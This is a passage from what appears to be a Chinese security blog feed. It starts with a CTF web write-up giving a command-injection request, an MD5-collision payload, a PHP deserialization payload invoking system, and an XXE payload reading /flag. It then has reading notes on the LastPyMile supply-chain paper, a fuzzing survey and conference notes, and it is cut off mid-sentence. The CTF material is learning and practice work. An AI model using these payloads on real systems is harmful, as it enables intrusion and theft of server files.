class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>md5相关参考</p><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/97618629">https://blog.csdn.net/vhkjhwbs/article/details/97618629</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?cmd=c\at%<span class="number">20</span>/flag HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="attr">Host</span>: f8ed05f8-<span class="number">2e32</span>-<span class="number">4176</span>-9f24-8c89e45aa403.node4.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span></span><br></pre></td></tr></table></figure><p>还可以用sort读文件</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>根据包特点构造<code>func=file_get_contents&amp;p=index.php</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>构造反序列化</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>找flag的payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O%3a4%3a<span class="string">&quot;Test&quot;</span>%3a2%3a&#123;s%3a1%3a<span class="string">&quot;p&quot;</span>%3bs%3a18%3a<span class="string">&quot;find+/+-name+flag*&quot;</span>%3bs%3a4%3a<span class="string">&quot;func&quot;</span>%3bs%3a6%3a<span class="string">&quot;system&quot;</span>%3b&#125;</span><br></pre></td></tr></table></figure><p>读flag</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=highlight_file&amp;p=<span class="regexp">/tmp/</span>flagoefiu4r93</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>XXE</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY admin SYSTEM <span class="string">&quot;file:///flag&quot;</span> &gt;]&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>dwad<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - LastPyMile: Identifying the Discrepancy between Sources and Packages</title>
      <link href="/2021/06/25/LastPyMile/"/>
      <url>/2021/06/25/LastPyMile/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：Duc-Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate</em></p><p><em>原文标题: LastPyMile: Identifying the Discrepancy between Sources and Packages</em></p><p><em>原文链接: <a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=research_activities:experiments:esecfse2021.pdf</a></em></p><p><em>原文来源: ESEC/FSE 2021</em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h1><p>通常情况下开源的软件包会在其对应的存储库上提供源代码，但开发者往往更倾向于使用集成式的包管理器来使用这些开源软件包（PyPI对应的pip）。这种方便的做法是假设源代码和软件包之间没有差异的，这会带来一定的安全风险。作者提出并实现了一种方法，名为LastPyMile，主要用于识别软件包的构造和其源代码库之间的差异，以防止恶意软件的注入。</p><p>以PyPI为例，作者做了详细的调查。下图为PyPI包的生命周期</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210625145547515.png" alt="image-20210625145547515"></p><p>作者致力于审查代码注入的问题， 而代码注入攻击中，往往只会有少量代码被修改。于是从这一点出发作者提出了三个问题：</p><h2 id="RQ1-能否有效地识别差异？"><a href="#RQ1-能否有效地识别差异？" class="headerlink" title="RQ1: 能否有效地识别差异？"></a>RQ1: 能否有效地识别差异？</h2><p>有一种现成的解决方案，即git log，但是由于git日志需要循环查看所有修订版，而且每次调用都会产生一个进程，这无疑是增加了分析机器的负担。作者的解决办法则是通过巧妙地结合软件包和运行软件的所有必需项目的散列值，以一种可扩展的方式提取这些差异。</p><p><strong>Answer</strong></p><ol><li>LastPyMile迭代所有的提交，以计算所有的文件哈希值并收集源代码库中的行内容。</li><li>LastPyMile处理一个软件包运行所需要的组件来计算文件哈希值并收集文件行数。</li><li>LastPyMile将所有计算好的文件哈希值和行数与源代码库中的文件哈希值和行数进行比较，报告那些差异性文件和行数。</li></ol><h2 id="RQ2-源代码和包存储库之间的“正常”差异有多大？"><a href="#RQ2-源代码和包存储库之间的“正常”差异有多大？" class="headerlink" title="RQ2: 源代码和包存储库之间的“正常”差异有多大？"></a>RQ2: 源代码和包存储库之间的“正常”差异有多大？</h2><p>作者研究了PyPI生态中超过2000个流行的软件包，这种差异是普遍存在的。但在Python源文件中一般只会发生很少的修改，所以作者采用审查作为替代方案。</p><p><strong>Answer</strong></p><ol><li>比较PyPI中的代码和相应的源代码库，平均有5.8%的运行时需要文件和2.6%的普通文件有差异。</li></ol><p>作者提到了可疑APIs的调用，说不能简单地将调用定义为可疑，会产生大量告警。这里存疑，因为告警和漏报的平衡点实在是很难界定。</p><h2 id="RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"><a href="#RQ3-LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？" class="headerlink" title="RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？"></a>RQ3: LastPyMile能否与软件包扫描器相结合，同时保持可控的警报数量？</h2><p>为了在该领域发挥效力，我们应该允许开发者和开发组织使用相同的工具来扫描软件包的源代码库，作为其审查过程的一部分。结合LastPyMile可以显著降低现有检测软件的告警数量</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>恶意代码可以隐藏在许多其他形式中，如网页（嵌入或外部JavaScript的HTML）或配置文件（带有恶意依赖的requirements.txt）。我们注意到大量的依赖性声明文件requirements.txt，其中包含使用pip install自动安装的依赖性列表。</p><p>确实，往往技艺不精的开发者拿着一个可重用安装包的时候是不太会关心requirements.txt里到底有哪些包，这些包又是哪些版本（是不是能够被攻击者攻击利用的版本），一旦执行了pip install -r requirements.txt，就会顺序安装所有条目，这老实说是有潜在风险的，可以研究。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ESEC/FSE 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fuzzing: a survey</title>
      <link href="/2021/06/18/Fuzzing%20a%20survey/"/>
      <url>/2021/06/18/Fuzzing%20a%20survey/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：J Li, B Zhao, C Zhang</em></p><p><em>原文标题: Fuzzing a survey</em></p><p><em>原文链接: <a href="https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf">https://seclab.bu.edu/papers/cname_cloaking-asiaccs2021.pdf</a></em></p><p><em>原文来源: <a href="https://cybersecurity.springeropen.com/">Cybersecurity</a></em></p><p><em>笔记作者：outx</em></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>​    互联网和世界数字经济运行在一个共享的、关键的开源软件（OSS）基础设施上。单个库中的安全缺陷可能会产生严重后果。例如，OpenSSL实现了用于安全通信的协议，并被包括大多数HTTPS网站在内的Internet服务器广泛使用。早期版本的OpenSSL中的“心脏滴血”漏洞会泄露机密数据并造成巨大的经济损失。目前，fuzzing是这方面最有前途的技术之一，现阶段有三种主要的fuzzing技术：黑盒，灰盒和白盒fuzzing。</p><p>​    黑盒fuzzing是在不了解程序内部构造的情况下产生输入的。其有两个主要的变种：突变型和生成型。在突变型黑盒fuzzing中，fuzzing从一个或多个种子输入开始。这些种子被修改以产生新的输入。随机突变被应用于输入中的随机位置。在生成型黑fuzzing中，输入是从头开始生成的。 如果提供了输入格式的结构规范，就会以此生成符合语法规范的新输入。Peach是一个流行的黑盒fuzzing工具。</p><p>​    灰盒fuzzing往往会利用程序来获得轻量级的反馈，用于指导fuzzer的工作。通常来说，程序中的一些控制位置在编译时进行检测，并提供初始种子语料库。 种子输入被改变以产生新的输入。产生的输入覆盖了新的控制位置，从而增加了代码覆盖率，进而被添加到种子语料库中。覆盖率反馈允许灰盒fuzzing逐渐深入到代码中。为了识别错误和漏洞，清理程序会将断言注入到程序中。现有的灰盒Fuzzing工具包括AFL、LibFuzzer和Honggfuzz。</p><p>​    白盒fuzzing技术是基于一种叫做符号执行的技术，它使用程序分析和约束解算器来系统地列举可能出现漏洞的程序路径。 在白盒fuzzing中用作后台的约束解算器是Satisfiability Modulo Theory(SMT)解算器，它允许对（无量子）一阶逻辑公式进行推理，其平等和函数/谓语符号来自不同的背景理论。白盒fuzzer会计算一个输入i的路径条件与i走过相同路径的输入集合。给定一个种子输入，计算并改变路径条件（与改变程序输入相反）。改变路径条件然后被发送到约束解算器以生成新的输入。这种技术的主要优点是其能够通过跟踪到目前为止的所有输入的路径条件，生成一个穿过新路径（新控制流）的输入。现有的白盒模糊工具包括KLEE和SAGE。</p><h1 id="Fuzzing原理"><a href="#Fuzzing原理" class="headerlink" title="Fuzzing原理"></a>Fuzzing原理</h1><h2 id="Fuzzing的工作流程"><a href="#Fuzzing的工作流程" class="headerlink" title="Fuzzing的工作流程"></a>Fuzzing的工作流程</h2><p>​    下图描述了传统Fuzzing的工作流程，由四个主要阶段组成，即测试用例生成阶段、测试用例运行阶段、程序执行状态监控和异常分析。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145110707.png" alt="image-20210618145110707"></p><p>​    Fuzzing是从生成一堆程序输入开始的，也就是测试用例。生成的测试用例的质量直接影响测试效果。输入应该尽可能地满足被测程序对输入格式的要求。而另一方面，输入应该足够碎片化，以便在图1的模糊测试工作过程中导致程序执行出现问题。根据目标程序，输入可以是不同文件格式的文件、网络通信数据、具有特定特征的可执行二进制文件等。如何产生足够多的测试用例是现阶段Fuzzing的主要挑战。一般来说，最先进的模糊器使用两种生成器，即基于生成的生成器和基于变异的生成器。测试用例在上一阶段生成后被送入目标程序。模糊器自动启动和完成目标程序的过程，并驱动目标程序的测试用例处理过程。在执行之前，分析人员可以配置目标程序的启动和结束方式，并预先定义参数和环境变量。通常情况下，模糊处理过程会在预定义的超时、程序执行挂起或崩溃时停止。Fuzzer会在目标程序的执行过程中监测执行状态，期待异常和崩溃。常用的异常监测方法包括对特定系统信号的监测、崩溃和其他违规行为。对于没有直观程序异常行为的违规行为，可以使用很多工具，包括AddressSanitizer、DataFlowsanitizer、ThreadSanitizer、LeakSanitizer等。当捕捉到违规行为时，Fuzzer会存储相应的测试用例，供后者回放和分析。在分析阶段，分析员试图确定捕获的违规行为的位置和根本原因。分析通常在调试器的帮助下进行，如GDB、windbg，或其他二进制分析工具，如IDAPro、OllyDbg等。二进制工具，如Pin，也可以用来监测收集的测试用例的确切执行状态，如线程信息、指令、寄存器信息等等。</p><h2 id="Fuzzer的分类"><a href="#Fuzzer的分类" class="headerlink" title="Fuzzer的分类"></a>Fuzzer的分类</h2><p>​    Fuzzer可以以各种方式进行分类，主要分为基于生成的和基于突变的[8]。</p><p>​    对于基于生成的Fuzzer，需要了解程序输入的知识。对于文件格式的Fuzzing，通常需要提供一个预先定义文件格式的配置文件。测试用例是根据配置文件生成的。有了给定的文件格式，由基于生成的Fuzzer生成的测试用例能够更容易地通过程序的验证，并更有可能测试目标程序的深层代码。然而，如果没有一个好的文件，分析文件格式是一项艰难的工作。因此，基于突变的Fuzzer更容易启动，也更适用。对于基于突变的模糊器，需要一组有效的初始输入。测试用例是通过初始输入的突变和Fuzzing过程中产生的测试用例产生的。下表中比较了基于生成的fuzzers和基于突变的fuzzers。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145552977.png" alt="image-20210618145552977"></p><p>​    就对程序源代码的依赖性和程序分析的程度而言，Fuzzing技术可以被分为白盒、灰盒和黑盒。白盒可以接触到程序的源代码，因此可以通过对源代码的分析收集更多的信息，包括测试用例如何影响程序的运行状态。黑盒是指在不了解目标程序内部的情况下进行Fuzzing。灰盒测试在没有源代码的情况下也能工作，并通过程序分析获得目标程序的内部信息。下表中列出了一些常见的白盒、灰盒和黑盒fuzzer。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20210618145642592.png" alt="image-20210618145642592"></p><p>​    根据遍历程序代码的策略，可以将Fuzzer分为定向Fuzzing和基于覆盖的Fuzzing。有方向的Fuzzer旨在生成覆盖程序的目标代码和目标路径的测试用例，而基于覆盖的Fuzzer旨在生成覆盖尽可能多程序代码的测试用例。定向Fuzzing希望对程序进行更快的测试，而基于覆盖的Fuzzing则希望进行更彻底的测试，并尽可能地检测更多的错误。但对于这两种测试方法而言，如何提取执行路径的信息是一个关键问题。</p><p>​    根据对程序执行状态的监控和测试用例的生成之间是否存在反馈，可以将模糊器分为无反馈Fuzzer和智能Fuzzer。智能Fuzzer根据收集到的信息调整测试用例的生成，即测试用例如何影响程序行为。对于基于突变的Fuzzer，反馈信息可用于确定哪部分测试用例应该被突变以及突变的方式。无反馈Fuzzer获得了更好的测试速度，而智能Fuzzer产生了更好的测试用例并获得了更好的效率。</p><h1 id="Fuzzing中的关键挑战"><a href="#Fuzzing中的关键挑战" class="headerlink" title="Fuzzing中的关键挑战"></a>Fuzzing中的关键挑战</h1><p>​    传统的Fuzzer在实践中通常采用基于随机的Fuzzing策略。程序分析技术的局限性导致了现在的状况，即Fuzzer不够智能。因此，Fuzzing仍然面临许多挑战。我们列出一些关键的挑战如下：</p><h2 id="如何对种子输入进行突变"><a href="#如何对种子输入进行突变" class="headerlink" title="如何对种子输入进行突变"></a>如何对种子输入进行突变</h2><p>​    基于突变的生成策略因其方便和容易设置而被最先进的Fuzzer广泛使用[9]。然而，如何变异并生成能够覆盖更多程序路径和更容易触发错误的测试用例是一个关键的挑战。具体来说，基于突变的Fuzzer在进行突变时需要解决两个问题：</p><ul><li>在哪里突变</li><li>如何突变</li></ul><p>​    只有少数关键位置的突变会影响执行的控制流程。因此，如何定位这些关键位置是非常重要的。此外，Fuzzer对关键位置的突变方式是另一个关键问题，即如何确定可以将测试引向程序的有潜在危险路径的值。总而言之，盲目的突变测试用例会造成测试资源的严重浪费，而更好的突变策略可以显著提高模糊测试的效率。</p><h2 id="低代码覆盖率"><a href="#低代码覆盖率" class="headerlink" title="低代码覆盖率"></a>低代码覆盖率</h2><p>​    更高的代码覆盖率代表了更高的程序执行状态覆盖率，以及更彻底的测试。先前的一些工作已经证明，覆盖率越高，发现问题的概率就越大。然而，大多数测试用例只覆盖了相同的几条路径，而大部分的代码逻辑却无法触及。因此，仅仅通过大量的测试用例生成和投入测试资源来实现高覆盖率并不是一个明智的选择。基于覆盖率的Fuzzer将在程序分析技术的帮助下解决这个问题，比如程序分析工具。</p><h2 id="通过验证"><a href="#通过验证" class="headerlink" title="通过验证"></a>通过验证</h2><p>​    程序通常在解析和处理之前对输入进行验证。验证的作用是保护程序，节省计算资源，保护程序免受无效输入和恶意构建的输入所造成的损害。无效的测试用例总是被忽略或丢弃的。Magic numbers、Magic strings、版本号检查和校验是程序中常用的验证方法。黑盒和灰盒Fuzzer生成的测试用例很难通过生成策略的验证，这会导致Fuzzing处理的效率相当低。因此，如何通过验证是另一个关键挑战。</p><h1 id="Fuzzing的新趋势"><a href="#Fuzzing的新趋势" class="headerlink" title="Fuzzing的新趋势"></a>Fuzzing的新趋势</h1><p>​    作为一种自动检测漏洞的方法，Fuzzing已经显示出它的高效力和高效率。然而，正如第三节所述，仍有许多挑战需要解决。在本节中，我们简单介绍一下自己关于Fuzzing发展趋势的理解。</p><p>​    首先，智能Fuzzing技术为Fuzzing的改进提供了更多可能性。在以前的工作中，传统的静态和动态分析被整合到Fuzzing中，以帮助改善这一过程。整体上来看已经有了一定的改进，但还是很有限。智能Fuzzing技术通过各种方式收集目标程序的执行信息，能够对Fuzzing过程进行了更精细的控制，并提出了很多Fuzzing策略。随着对不同类型漏洞的深入了解，并利用漏洞的特点进行模糊处理，智能模糊处理可以帮助发现更复杂的漏洞。</p><p>​    第二，新技术可以在许多方面帮助改善脆弱性。机器学习和相关技术等这类新兴技术已经被用来改善模糊测试中的测试用例生成。如何将新技术的优势和特点与Fuzzing结合起来，如何将Fuzzing中的关键挑战转化或分割成新技术所擅长的问题，是另一个值得考虑的问题。</p><p>​    第三，新的系统特征和硬件特征也不应该被忽视。根据前人的一些工作我们可以知道新的硬件特性能够极大地提高Fuzzing的效率。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>​    Fuzzing是目前最有效和最高效的漏洞发现方案。在本文中，我们对Fuzzing方法及其最新进展做了全面的回顾和总结。首先我们介绍了Fuzzing的基本原理和工作流程，然后我们介绍了Fuzzing的基本分类标准。同时，我们还介绍了Fuzzing在这些年的发展过程中遇到的问题和挑战。最后，我们总结了与Fuzzing相结合的技术，以及Fuzzing的应用和可能的新趋势。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Survey </tag>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conference - InForSec</title>
      <link href="/2021/06/06/Inforsec%20Learning/"/>
      <url>/2021/06/06/Inforsec%20Learning/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>北京之旅</em></p></blockquote><h1 id="Session-1"><a href="#Session-1" class="headerlink" title="Session 1"></a>Session 1</h1><h2 id="Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison"><a href="#Precisely-Characterizing-Security-Impact-in-a-Floodof-Patches-via-Symbolic-Rule-Comparison" class="headerlink" title="Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison"></a>Precisely Characterizing Security Impact in a Floodof Patches via Symbolic Rule Comparison</h2><p><strong><em>Q: 为什么要识别与安全相关的 bug？</em></strong><br>作者在探究之初提出了上述这个问题，然后围绕这个问题进行了很多思考，得出了以下的两点继续研究的动机;</p><ol><li>bug 报告数量很大</li><li>补丁与代码的传播不及时</li></ol><p>以上两点总结起来可以理解为现有的一些项目或者代码的维护者的数量是有限的，同时每个人的精力也是有限的。对于每天上报的 bug 报告，维护者很难及时和全面的审查这些报告。为此，作者提出了以下 Goal：</p><p><strong><em>Goal: 识别与安全相关的漏洞补丁</em></strong><br>具体来说，识别与安全相关的漏洞补丁能够让一些项目或者代码的维护者能够及时的打上那些威胁严重的安全漏洞补丁以防止被恶意攻击者攻击，而不用耗费精力在修复那些无关紧要的 bug。</p><p><strong>传统方法</strong><br>传统的识别方法主要有：</p><ol><li>文本分析：主要是依靠关键字分析</li><li>统计分析：主要是依靠分析趋势</li></ol><p>但传统方法具有很明显的局限性，一是其精度难以保证，二是维护者难以判断 bug 的影响力。</p><p><strong>通用代码安全规则和违规行为</strong></p><ol><li>界内访问（内存、数组）—— 越界访问(out-of-bound access)</li><li>不允许指针等 free 后被再使用 —— free 后重用(use-after-free)</li><li>变量应初始化后使用 —— 未初始化使用(uninitialized use)</li><li>敏感操作前的权限检查 —— 绕过权限(permission bypass)</li></ol><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9a3cab95-0dd9-4d1d-b526-7527e7741f65.png"></p><p>基于以上通用代码安全规则和其对应的违规行为，作者提出了一个定义：给定一个代码和补丁，在没有打补丁的情况下，代码会违反以上安全规则。</p><p><strong>SID 整体结构</strong><br>根据上述定义，作者提出了 SID，这是一个基于 LLVM 的解决方案，其框架如下<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/d90df980-318e-4d96-8d8a-c78097e800b2.png"></p><p>主要分为三部分：预处理，剖析补丁，符号规则比较</p><ol><li>预处理</li></ol><p>在预处理部分，作者首先根据 bug 补丁将软件的版本分为打了补丁的版本和没有打补丁的版本，然后分别调用 LLVM 将其编译为对应的 LLVM IRS。</p><ol start="2"><li>剖析补丁</li></ol><p>主要是通过静态分析来对不同版本的代码进行分析。在这个阶段，SID 根据补丁模型对补丁进行剖析，以确定关键组件。SID 首先识别出打过补丁和没有打过补丁的版本中的安全操作。接下来，SID 对关键变量进行数据流分析，以收集存在漏洞的代码片段。</p><ol start="3"><li>符号规则比较</li></ol><ul><li>对于打了补丁的版本<br>在打了补丁的版本中，存在的漏洞往往是存在于补丁之后。例如，对于越界访问来说，通常补丁会在进行访问操作之前校验访问的空间是否是正确的。换句话来说，在打了补丁的版本中，违反安全规则这一行为是不存在的，即打了补丁的版本不存在相应的漏洞。</li><li>对于没打补丁的版本<br>对于没有打补丁的版本，由于其存在漏洞的代码是程序执行流程中可达的，因此执行程序的过程中是会出发漏洞的。换句话来说，对于没有打补丁的版本来说，不违反安全规则这一行为是不存在的，即没有打补丁的版本一定存在相应的漏洞。</li></ul><p>通过这两方面的约束，才能够证明这个补丁修复的是一个安全相关的 bug。</p><p><strong>方法表现</strong><br>作者分析了 54K 的补丁，平均对每个补丁的分析时间为 0.83 秒。同时，作者主要从假阳性和假阴性两方面来分析</p><ol><li>假阳性分析<br>作者通过 SID 